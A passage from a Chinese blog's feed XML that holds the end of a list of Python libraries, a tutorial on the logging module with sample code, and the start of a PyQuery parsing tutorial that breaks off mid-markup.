Django电子邮件后台，使用AWS SES和Celery。</p><p>modoboa，邮件托管和管理平台，包括现代和简化Web UI。</p><p>envelopes，邮件工具。</p><p>mailjet，批量邮寄mailjet API接口，带统计。</p><p>Talon，利爪，Mailgun库，提取消息和签名。mailjet- Mailjet API implementation for batch mailing, statistics and more., Talon - Mailgun library to extract message quotations and signatures.,pyzmail，编写，发送和解析电子邮件。</p><p>furl，燃料，小型的的URL解析库库。</p><p>purl，简单的，干净的API，操纵URL。</p><p>pyshorteners，纯Python库，URL短网址编辑。</p><p>short_url，短网址生成。</p><p>Scrapy，快速屏幕截取和网页抓取的框架。</p><p>portia，波西亚，Scrapy的可视化扩展。</p><p>feedparser，信息源解释器</p><p>RoboBrowser，简单的网页浏览Python函数库，没有使用Web浏览器。</p><p>MechanicalSoup，网站自动化互动测试工具包。</p><p>mechanize，网页浏览编程工具。</p><p>Demiurge，造物主，-PyQuery的轻量级工具。</p><p>newspaper,提取报纸新闻。</p><p>html2text,转换HTML为 Markdown格式的文本。</p><p>python-goose,HTML内容提取器。</p><p>lassie,莱西,人性化的网站内容检索。</p><p>micawber,通过UR抓提网页的函数库。</p><p>sumy，概要，文本和HTML网页的自动文摘模块。</p><p>Haul，距离，可扩展的图像爬虫。</p><p>python-readability,可读性工具Arc90,快速的Python接口。</p><p>opengraph,OpenGraphProtocol协议解析模块,textract，从任何文件，Word，PowerPoint，PDF文件中提取文本，等。</p><p>sanitize，消毒，使混乱的数据变的理智。</p><p>AutobahnPython， WebSocket和WAMP的函数库，使用 Twisted和PythonWebSocket-for-Python，websocket客户端和服务器端函数库。</p><p>SimpleXMLRPCServer，python标准库，简单的XML-RPC服务器，单线程。SimpleJSONRPCServer，JSON-RPC规范实施函数库。</p><p>zeroRPC，基于ZeroMQ和MessagePack的RPC实现。</p><p>apache-libcloud，所有云服务的Python接口库。</p><p>wifi，WiFi -一套个Python库和命令行工具与WiFi，用于[Linux]。</p><p>streamparse，运行Python代码和数据的实时流。集成了Apache Storm。</p><p>boto，亚马逊网络服务接口。</p><p>twython，Twitter推特API。</p><p>google-api-python-client，谷歌客户端API。</p><p>gspread，谷歌电子表格的Python API。</p><p>facebook-sdk，facebook平台Python SDK。</p><p>facepy，简易的facebook图形APIgmail，Gmail的Python接口。</p><p>django-wordpress，Django的WordPress的模型和视图。</p><p>Web框架</p><p>Django，最流行的Python-Web框架，鼓励快速开发,并遵循MVC设计，开发周期短ActiveGrid企业级的Web2.0解决方案Karrigell简单的Web框架，自身包含了Web服务，py脚本引擎和纯python的数据库</p><p>PyDBLitewebpy 一个小巧灵活的Web框架，虽然简单但是功能强大CherryPy基于Python的Web应用程序开发框架。</p><p>Pylons 基于Python的一个极其高效和可靠的Web开发框架</p><p>Zope 开源的Web应用服务器</p><p>TurboGears 基于Python的MVC风格的Web应用程序框架Twisted流行的网络编程库，大型Web框架。</p><p>QuixoteWeb开发框架Flask,轻量级web框架。</p><p>Bottle，快速，简单和轻量级的WSGI模式Web框架。</p><p>Pyramid，轻量级，快速，稳定的开源Web框架。</p><p>web2py，简单易用的全堆栈Web框架和平台。</p><p>web.py，强大、简单的Web框架。</p><p>TurboGears，便于扩展的Web框架。</p><p>CherryPy，极简Python Web框架，支持，HTTP 1.1和WSGI线程池。</p><p>Grok，基于Zope3的Web框架。</p><p>Bluebream，开源的Web应用服务器，原名Zope 3。</p><p>guava，轻量级，高性能的Python-Web框架，采用c语言编写。</p><p>django-cms，基于Django企业级开源CMS。</p><p>djedi-cms轻量级但功能强大的Django CMS的插件，内联编辑和性能优化。</p><p>FeinCMS，基于Django的先进内容管理系统。</p><p>Kotte，高层次的Python的Web应用框架，基于Pyramid。</p><p>Mezzanine，强大，一致，灵活的内容管理平台。</p><p>Opps，基于Django的CMS，用于高流量的报纸、杂志和门户网站。</p><p>Plone，基于Zope的开源应用服务器Zope。</p><p>Quokka，灵活，可扩展的，轻量级的CMS系统，使用Flask和MongoDB。</p><p>Wagtail，Django内容管理系统。</p><p>Widgy，CMS框架，基于Django。</p><p>django-oscar，Django奥斯卡，开源的电子商务框架。</p><p>django-shop，基于Django的网店系统。</p><p>merchant，支持多种付款处理工具。</p><p>money，可扩展的货币兑换解决方案。</p><p>python-currencies，货币显示格式。</p><p>cornice，Pyramid的REST框架。</p><p>django-rest-framework，Django框架，强大灵活的工具，可以很容易地构建Web API。</p><p>django-tastypie，创造精美的Django应用程序API接口。</p><p>django-formapi，创建JSON API、HMAC认证和Django表单验证。</p><p>flask-api，提供统一的浏览器体验，基于Django框架。</p><p>flask-restful，快速构建REST API支持扩展。</p><p>flask-api-utils，flask的扩展。</p><p>falcon，猎鹰，高性能的Python框架，构建云API和Web应用程序后端。</p><p>eve，夏娃，REST API框架，使用Flask，MongoDB和良好意愿。</p><p>sandman，睡魔，为现有的数据库驱动的系统，自动生成REST API。</p><p>restless，类似TastyPie的框架。</p><p>savory-pie，REST API构建函数库（Django，及其他）Jinja2，现代设计师友好的语言模板。</p><p>Genshi，网络感知输出模板工具包。</p><p>Mako，马可，Python平台的超高速、轻型模板。</p><p>Chameleon，变色龙，一个HTML / XML模板引擎。仿照ZPT，优化速度。</p><p>Spitfire，快速的Python编译模板。</p><p>django-haystack,大海捞针,Django模块搜索。</p><p>elasticsearch-py,Elasticsearch官方低级的Python客户端。</p><p>solrpy,solr客户端。</p><p>Whoosh,呼,快速，纯Python搜索引擎库。</p><p>Feedly，建立新闻和通知系统的函数库，使用Cassandra和Redis。</p><p>django-activity-stream,Django活动流,从你网站上的行动,产生通用的活动流。</p><p>Beaker，烧杯，一个缓存和会话使用的Web应用程序，独立的Python脚本和应用程序库。</p><p>dogpile.cache，是Beaker作者的下一代替代作品。</p><p>HermesCache，Python的缓存库，基于标签的失效及预防Dogpile效果。</p><p>django-cache-machine，Django缓存机，自动缓存失效，使用ORM。</p><p>django-cacheops，自动颗粒事件驱动，ORM缓存失效。</p><p>johnny-cache,约翰尼高速缓存框架,Django应用程序。</p><p>django-viewlet,渲染模板部件扩展缓存控制。</p><p>pylibmc,在libmemcached接口。</p><p>WTForms-JSON,JSON表单数据处理扩展。</p><p>Deform， HTML表单生成的函数库。</p><p>django-bootstrap3，bootstrap3，集成了Django。</p><p>django-crispy-forms，Django程序，可以创建优雅的表单。</p><p>django-remote-forms，Django的远程表单，Django表格的序列化程序。</p><p>django-simple-spam-blocker，Django简单的垃圾邮件拦截器。</p><p>django-simple-captcha，Django简单验证码，简单的和高度可定制的Django应用程序，用于添加验证码图像Ajenti，服务器管理面板。</p><p>Grappelli，界面花哨的django皮肤。</p><p>django-suit，Django替代o界面（仅用于非商业用途）。</p><p>django-xadmin，Django管理面板替代工具。</p><p>flask-admin，简单的flask管理界面框架flower，实时监控和Web管理面板。</p><p>Pelican，鹈鹕，Markdown或ReST，字王内容主题。支持 DVCS, Disqus. AGPL。</p><p>Cactus,仙人掌,设计师的网站静态生成器。</p><p>Hyde，海德， 基于Jinja2的静态网站生成器。</p><p>Nikola，尼古拉-一个静态网站和博客生成器。</p><p>Tags，标签，最简单的静态网站生成器。</p><p>Tinkerer，工匠，基于Sphinx的静态网站生成器。</p><p>asyncio，（在Python 3.4 +是Python标准库），异步I/O，事件循环，协同任务。</p><p>gevent，基于Python的网络库。</p><p>Twisted，扭曲，事件驱动的网络引擎。</p><p>Tornado，龙卷风，Web框架和异步网络的函数库。</p><p>pulsar，脉冲星，事件驱动的并行框架的Python。</p><p>diesel，柴油，绿色的，基于事件的I/O框架。</p><p>eventlet，WSGI支持异步框架。</p><p>pyzmq， 0MQ消息库的Python封装。</p><p>txZMQ,基于Twisted的0MQ消息库封Crossbar,开源统一应用路由器（WebSocket和WAMP）。</p><p>wsgiref，Python标准库，WSGI封装实现，单线程。</p><p>Werkzeug，机床，WSGI工具函数库，很容易地嵌入到你自己的项目框架。</p><p>paste，粘贴，多线程，稳定的，久经考验的WSGI工具。</p><p>rocket，火箭，多线程服务，基于Pyramid。</p><p>netius，快速的、异步WSGI服务器，gunicorn，forked前身，部分用C写的。</p><p>fapws3，异步网络，用C写的。</p><p>meinheld，异步WSGI服务器，是用C写的。</p><p>bjoern，-快速的、异步WSGI服务器，用C写的。</p><p>安全</p><p>Permissions函数库，允许或拒绝用户访问数据或函数。</p><p>django-guardian,Django守护者，管理每个对象的权限，用于Django 1.2 +Carteblanche，管理导航和权限。</p><p>Authomatic，简单强大的认证/授权客户端。</p><p>OAuthLib， 通用，规范，OAuth请求签约工具。</p><p>rauth，用于OAuth 1.0，2.0，的Python库。</p><p>python-oauth2，利用全面测试，抽象接口来创建OAuth的客户端和服务器。</p><p>python-social-auth，易于安装的社会认证机制。</p><p>django-oauth-toolkit,Django OAuth工具包django-oauth2-provider,Django OAuth2工具包。</p><p>django-allauth，Django认证的应用程序。</p><p>Flask-OAuthlib，Flask的OAuth工具包sanction，制裁，简单的oauth2客户端。</p><p>jose，[JavaScript]对象签名和加密(JOSE)草案实施，标记状态。</p><p>python-jwt，JSON的Web令牌生成和验证模块。</p><p>pyjwt，JSON的Web令牌草案01。</p><p>python-jws，JSON的Web令牌草案02。</p><p>PyCrypto，Python的加密工具包。</p><p>Paramiko，sshv2协议的实现，提供了客户端和服务器端的功能。</p><p>cryptography，密码开发工具包。</p><p>PyNac，网络和密码（NaCl）函数库。</p><p>hashids，hashids的 Python函数库。</p><p>Passlib，安全的密码存储/哈希库，非常高的水平。</p><p>hashlib,md5, sha等hash算法，用来替换md5和sha模块，并使他们的API一致。</p><p>它由OpenSSL支持，支持如下算法：md5,sha1, sha224, sha256, sha384, sha512.</p><p>GUI库</p><p>名称简介PyGtk，基于Python的GUI程序开发GTK+库PyQt用于Python的QT开发库WxPythonPython下的GUI编程框架，其消息机制与MFC的架构相似,入门非常简单，需要快速开发相关的应用可以使用这个TkinterPython下标准的界面编程包，因此不算是第三方库了PySide，跨平台Qt的应用程序和用户界面框架，支撑Qt v4框架。</p><p>wxPython，混合wxWidgets的C++类库。</p><p>kivy，创建应用程序GUI函数库，看运行于Windows，Linux，MAC OS X，[Android]和[iOS]。</p><p>curse，用于创建终端GUI应用程序。</p><p>urwid，创建终端GUI应用程序窗体的函数库，支持事件，色彩丰富。</p><p>pyglet，跨平台的窗口和多媒体库的Python。</p><p>Tkinter，是Python事实上的标准GUI软件包。</p><p>enaml，创建漂亮的用户界面，语法类似QML。</p><p>Toga，托加，OS原生GUI工具包。【构建封装】</p><p>pyenv,简单的Python版本管理。</p><p>virtualenv,创建独立的Python环境，用于同时安装不同版本的python环境。</p><p>virtualenvwrapper，是virtualenv的一组扩展。</p><p>pew,一套管理多个虚拟环境的工具。</p><p>vex，使运行指定的virtualenv命令。</p><p>PyRun，一个单文件，无需安装的Python版本管理工具。</p><p>PIP，Python包和依赖的管理工具。</p><p>easy_install，软件包管理系统,提供一个标准的分配Python软件和 函式库的格式。是一个附带设置工具的模块，和一个第三方函式库。旨在加快Python函式库的分配程式的速度。类似Ruby语言的RubyGems 。</p><p>conda，跨平台，二进制软件包管理器。</p><p>Curdling，一个管理Python包的命令行工具。</p><p>wheel，Python发行的新标准，旨在替代eggs.cx-Freeze，跨平台的，用于打包成可执行文件的库</p><p>py2exe, Windows平台的Freeze脚本工具，Py2exe ，将python脚本转换为windows上可以独立运行的可执行程序py2app，MAC OS X平台的Freeze脚本工具。</p><p>pyinstaller，-转换成独立的可执行文件的Python程序（跨平台）。</p><p>pynsist,构建Windows安装程序的工具，用Python编写。</p><p>dh-virtualenv,建立和分发virtualenv(Debian软件包格式)</p><p>PyPI，新一代的Python包库管理工具。warehouse,新一代的Python包库（PyPI）管理工具。</p><p>devpi，PyPI服务器和包装/测试/发布工具。</p><p>localshop，PyPI官方包镜像服务器，支持本地（私人）包上传。</p><p>buildout，创建，组装和部署应用程序的多个部分，其中一些可能是非基于Python的。</p><p>SCons，软件构造工具。</p><p>platformio，一个控制台的工具，构建的代码可用于不同的开发平台。</p><p>bitbake，特殊设计的工具，用于创建和部署[嵌入式]Linux软件包</p><p>fabricate，自动为任何编程语言，生成依赖包。</p><p>django-compressor，Django压缩机，压缩和内联JavaScript或CSS，链接到一个单一的缓存文件。</p><p>jinja-assets-compressor，金贾压缩机，一个Jinja扩展，通过编译，压缩你的资源。</p><p>webassets，优化管理，静态资源，独特的缓存清除。</p><p>fanstatic，球迷，包优化，提供静态文件。</p><p>fileconveyor，监控资源变化，，可保存到CDN（内容分发网络）和文件系统。</p><p>django-storages，一组自定义存储Django后台。</p><p>glue，胶胶，一个简单的命令行工具，生成CSS Sprites。</p><p>libsass-python，Sass (层叠样式表)的Python接口。</p><p>Flask-Assets，整合应用程序资源。【代码调试】</p><p>unittest，Python标准库，单元测试框架。</p><p>nose，鼻子，unittest延伸产品。</p><p>pytest，成熟的全功能的Python测试工具。</p><p>mamba，曼巴，Python的权威测试工具，出自BDD的旗下。</p><p>contexts，背景，BDD测试框架，基于C#。</p><p>pyshould，should风格的测试框架，基于PyHamcrest.pyvows，BDD风格测试框架Selenium，web测试框架，Python绑定Selenium。</p><p>splinter，分裂，测试Web应用程序的开源工具。</p><p>locust，刺槐，可扩展的用户负载测试工具，用Python写的。</p><p>sixpack，语言无关的A/B测试框架。</p><p>mock，模拟对象（英语：mock object，也译作模仿对象），模拟测试库。</p><p>responses，工具函数，用于mock模拟测试。</p><p>doublex-强大的测试框架。</p><p>freezegun，通过时间调整，测试模块。</p><p>httpretty， HTTP请求的模拟工具。</p><p>httmock，mock模拟测试。</p><p>coverage，代码覆盖度量测试。</p><p>faker，生成模拟测试数据的Python包。</p><p>mixer，混频器，产生模拟数据，用于Django ORM，SQLAlchemy，Peewee, MongoEngine, Pony ORM等model_mommy，在Django创建测试随机工具。</p><p>ForgeryPy，易用的模拟数据发生器。</p><p>radar，雷达，生成随机日期/时间。</p><p>FuckIt.py，测试Python代码运行。</p><p>Code Analysispysonar2，Python类型索引。</p><p>pycallgraph,可视化的流量（调用图）应用程序。</p><p>code2flow,转换Python和JavaScript代码到流程图。</p><p>LinterFlake8，源代码模块检查器pylama，Python和JavaScript代码审计工具。</p><p>Pylint，源代码分析器，它查找编程错误，帮助执行一个代码标准和嗅探一些代码味道。注意：相比于PyChecker，Pylint是一个高阶的Python代码分析工具，它分析Python代码中的错误。</p><p>Pyflakes，一个用于检查Python源文件错误的简单程序。Pyflakes分析程序并且检查各种错误。它通过解析源文件实现，无需导入。</p><p>pdb,Python标准库,Python调试器。</p><p>ipdb,IPython使用的PDB。</p><p>winpdb，独立于平台的GUI调试器。</p><p>pudb，全屏，基于python调试控制台。</p><p>pyringe，-可附着于及注入代码到Python程序的调试器。</p><p>python-statsd，statsd服务器客户端。</p><p>memory_profiler， 内存监视。</p><p>profiling，交互式Python分析器。</p><p>django-debug-toolbar, Django调试工具栏,显示各种调试信息:当前请求/响应。django-devserver,Django调试工具。</p><p>flask-debugtoolbar,flask调试工具。</p><p>（完）</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;转载自：&lt;a href=&quot;https://www.jianshu.com/p/d25a9169fe86&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;https://www.jianshu.com/p/d25a9169fe86&lt;/
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>python-logging模块</title>
    <link href="http://www.xpshuai.cn/python-logging%E6%A8%A1%E5%9D%97/"/>
    <id>http://www.xpshuai.cn/python-logging模块/</id>
    <published>2020-02-19T12:09:06.000Z</published>
    <updated>2020-02-20T10:13:37.000Z</updated>
    
    <content type="html"><![CDATA[<h6 id="为什么会用logging模块"><a href="#为什么会用logging模块" class="headerlink" title="为什么会用logging模块"></a>为什么会用logging模块</h6><ul><li>灵活性好，方便配置</li><li>输出或保存不同级别日志</li></ul><h6 id="logging模块结构"><a href="#logging模块结构" class="headerlink" title="logging模块结构"></a>logging模块结构</h6><p>logging 在源码中有三个文件,结构如下:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">├── config.py</span><br><span class="line">├── handlers.py</span><br><span class="line">└── __init__.py</span><br></pre></td></tr></table></figure><ul><li><code>__int__.py</code>中实现了基础功能,主要的逻辑就在这个文件中</li><li><code>handlers.py</code>是一些Handlers用起来很方便的.</li><li><code>config.py</code>是对配置做处理的方法.</li></ul><h6 id="基础"><a href="#基础" class="headerlink" title="基础"></a>基础</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> logging</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.初始化   相当于</span></span><br><span class="line">logger = logging.getLogger(<span class="string">"test_name"</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.设置级别</span></span><br><span class="line">logger.setLevel(logging.DEBUG)  <span class="comment"># 低于这个级别就不去管他</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 3. 定义handler:</span></span><br><span class="line"><span class="comment"># 在控制台输出  FileHandler</span></span><br><span class="line">sh = logging.StreamHandler()   <span class="comment"># 定义控制台输出 </span></span><br><span class="line">sh.setLevel(logging.ERROR)   <span class="comment"># 设置最低级别 达到什么级别的时候管 低于..不执行  </span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 写在文件里面 SteamHandler</span></span><br><span class="line">fh = logging.FileHandler(<span class="string">r'file_test.log'</span>)</span><br><span class="line">fh.setLevel(logging.DEBUG)  <span class="comment"># 达到什么级别就写到文件里面去</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 格式化输出   formatter     注意之间逗号不需要加，只是为了美观</span></span><br><span class="line">formatter = logging.Formatter(</span><br><span class="line">   <span class="string">'时间：%(asctime)s,'</span></span><br><span class="line">   <span class="string">'日志级别:%(levelname)s,'</span></span><br><span class="line">   <span class="string">'日志信息：%(message)s,'</span></span><br><span class="line">   )</span><br><span class="line">sh.setFormatter(formatter)  <span class="comment"># 设置控制台的样式</span></span><br><span class="line">fh.setFormatter(formatter)  <span class="comment"># 设置文件的样式</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 添加进去</span></span><br><span class="line">logger.addHandler(sh)</span><br><span class="line">logger.addHandler(fh)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">   logger.debug(<span class="string">'测试中'</span>)</span><br><span class="line">   logger.info(<span class="string">'正常运行'</span>)</span><br><span class="line">   logger.warn(<span class="string">'警告'</span>)</span><br><span class="line">   logger.error(<span class="string">'完了error'</span>)</span><br><span class="line">   logger.critical(<span class="string">'炸了'</span>)</span><br><span class="line"></span><br><span class="line">   <span class="comment"># 例如：</span></span><br><span class="line">   <span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(a)</span>:</span></span><br><span class="line">      <span class="keyword">try</span>:</span><br><span class="line">         num = <span class="number">40</span>/a</span><br><span class="line">         logger.info(num)   <span class="comment"># 正常的话记录</span></span><br><span class="line">      <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">         logger.error(e)   <span class="comment"># 将错误记录</span></span><br><span class="line">      </span><br><span class="line">   func(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">##  logging 中的级别</span></span><br><span class="line"><span class="string">"""</span></span><br><span class="line"><span class="string">DEBUG：调试信息，通常在诊断问题的时候用得着；</span></span><br><span class="line"><span class="string">INFO：普通信息，确认程序安装预期运行；</span></span><br><span class="line"><span class="string">WARNING：警告信息，表示发生了意想不到的事情，或者指示接下来可能会出现一些问题，但是程序还是继续运行；</span></span><br><span class="line"><span class="string">ERROR：错误信息，程序运行中出现了一些问题，一些功能没有执行；</span></span><br><span class="line"><span class="string">CRITICAL：危险信息，一个严重的错误，导致程序无法继续运行。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string"># 对应下面5个方法</span></span><br><span class="line"><span class="string">debug</span></span><br><span class="line"><span class="string">info</span></span><br><span class="line"><span class="string">Warning</span></span><br><span class="line"><span class="string">error  </span></span><br><span class="line"><span class="string">critical </span></span><br><span class="line"><span class="string">"""</span></span><br></pre></td></tr></table></figure><h6 id="logging常用的格式化"><a href="#logging常用的格式化" class="headerlink" title="logging常用的格式化:"></a>logging常用的格式化:</h6><p><img src="/python-logging模块/logging常用的格式化.jpg"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h6 id=&quot;为什么会用logging模块&quot;&gt;&lt;a href=&quot;#为什么会用logging模块&quot; class=&quot;headerlink&quot; title=&quot;为什么会用logging模块&quot;&gt;&lt;/a&gt;为什么会用logging模块&lt;/h6&gt;&lt;ul&gt;
&lt;li&gt;灵活性好，方便配置&lt;/li&gt;
&lt;
      
    
    </summary>
    
      <category term="Python" scheme="http://www.xpshuai.cn/categories/Python/"/>
    
    
      <category term="Python" scheme="http://www.xpshuai.cn/tags/Python/"/>
    
      <category term="logging" scheme="http://www.xpshuai.cn/tags/logging/"/>
    
  </entry>
  
  <entry>
    <title>python-PyQuery</title>
    <link href="http://www.xpshuai.cn/python-PyQuery/"/>
    <id>http://www.xpshuai.cn/python-PyQuery/</id>
    <published>2020-02-19T12:02:10.000Z</published>
    <updated>2020-02-23T07:34:51.000Z</updated>
    
    <content type="html"><![CDATA[<p><strong>Python爬虫解析库，主流的有</strong></p><ul><li>PyQuery</li><li>Beautifulsoup</li><li>Scrapy Selectors</li><li>正则表达式。</li></ul><p>PyQuery和scrapy Selectors都是基于lxml模块，而lxml和正则表达式都是C语言写的，只有Beautifulsoup是用纯Python编写的，所以在实测中，<code>Beautifulsoup</code> 的解析速度比其他几种<code>慢了5倍以上</code>！</p><p><code>正则表达式</code>的构造稍微<code>复杂</code>一点，一般在结构化的网页中没必要用正则（易出错）;</p><p>Scrapy Selectors支持css，xpath以及正则表达式 ;</p><p><code>PyQuery</code>只支持css（css语法更精简一些），<code>类似于jQuery</code></p><p>Scrapy Selector中的css语法和PyQuery中的略有不同，本文以PyQuery为例（不用Scrapy框架的话，PyQuery就够用了）</p><hr><h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pyquery</span><br></pre></td></tr></table></figure><h3 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h3><h6 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h6><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">from</span> pyquery <span class="keyword">import</span> PyQuery <span class="keyword">as</span> pq</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">url = <span class="string">'https://www.guokr.com/'</span></span><br><span class="line">r = requests.get(url)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 实例化</span></span><br><span class="line">doc = pq(r.text)</span><br></pre></td></tr></table></figure><h6 id="获取元素"><a href="#获取元素" class="headerlink" title="获取元素"></a>获取元素</h6><p>跟jQuery是一样的，也就不细说了，简单举几个小例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.获取class是content-title的元素</span></span><br><span class="line"><span class="comment"># class是点.        id是#</span></span><br><span class="line">print(doc(<span class="string">'h2.content-title'</span>))      <span class="comment"># 获取果壳网</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 2.获取标签的文本内容</span></span><br><span class="line">print(doc(<span class="string">'h2.content-title'</span>).text())</span><br><span class="line"></span><br><span class="line"><span class="comment"># 3.遍历（先items()）</span></span><br><span class="line">lis = doc(<span class="string">'h2.content-title'</span>).items()</span><br><span class="line"><span class="keyword">for</span> li <span class="keyword">in</span> lis:</span><br><span class="line">    print(li.text())</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 获取class为content的div标签下面的ul下面的li</span></span><br><span class="line"><span class="comment"># 用空格表示子孙节点</span></span><br><span class="line">lis = doc(<span class="string">'div.content ul li'</span>).items()</span><br><span class="line"><span class="comment">#lis = doc('div.content li').items()</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lis:</span><br><span class="line">    print(i.text())</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 5. 如果类名不唯一，还可以加上其他的类名一起定位</span></span><br><span class="line">print(doc(<span class="string">'div.cont.a.b.c.d'</span>))</span><br><span class="line"><span class="comment"># 标签里的空格表示`并列`，表示这个div标签有cont,a,b,c,d这五个类名，但在css语法里空格表示`嵌套`，所以我们要添加其他类名的时候`不能输入空格`，而是直接用`小数点`来添加其他类名</span></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 6. 获取属性         attr("属性名")</span></span><br><span class="line">lis = doc(<span class="string">'div.content li'</span>).items()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lis:</span><br><span class="line">    print(i.text(),i(<span class="string">'a'</span>).attr(<span class="string">'href'</span>))</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 7. 其他的一些选择器</span></span><br><span class="line">lis = doc(<span class="string">'div.content ul li'</span>)</span><br><span class="line"><span class="comment">#父节点,包含父节点的所有子孙节点的内容</span></span><br><span class="line"><span class="comment">#相当于</span></span><br><span class="line"><span class="comment">#print(doc('div.content ul'))</span></span><br><span class="line">print(lis.parent())</span><br><span class="line"><span class="comment">#祖先节点,就相当于所有源代码了</span></span><br><span class="line">print(lis.parents())</span><br><span class="line"><span class="comment">#兄弟节点,即同级节点，不包含自己</span></span><br><span class="line">print(lis.siblings)</span><br></pre></td></tr></table></figure><h4 id="其他技巧"><a href="#其他技巧" class="headerlink" title="其他技巧"></a>其他技巧</h4><p>1.伪类选择器</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#第二个标签</span></span><br><span class="line">lis = doc(<span class="string">'div.content li:nth-child(2)'</span>).items()</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> lis:</span><br><span class="line">    print(i.text(),i(<span class="string">'a'</span>).attr(<span class="string">'href'</span>))</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 第一个a标签的语法是 a:first-child,最后一个是a:last-child,其它位置的语法如上图所示，第几个括号里就是几（当然第一个你也可以写成 li:nth-child(1))</span></span><br></pre></td></tr></table></figure><p>类似的</p><figure class="highlight 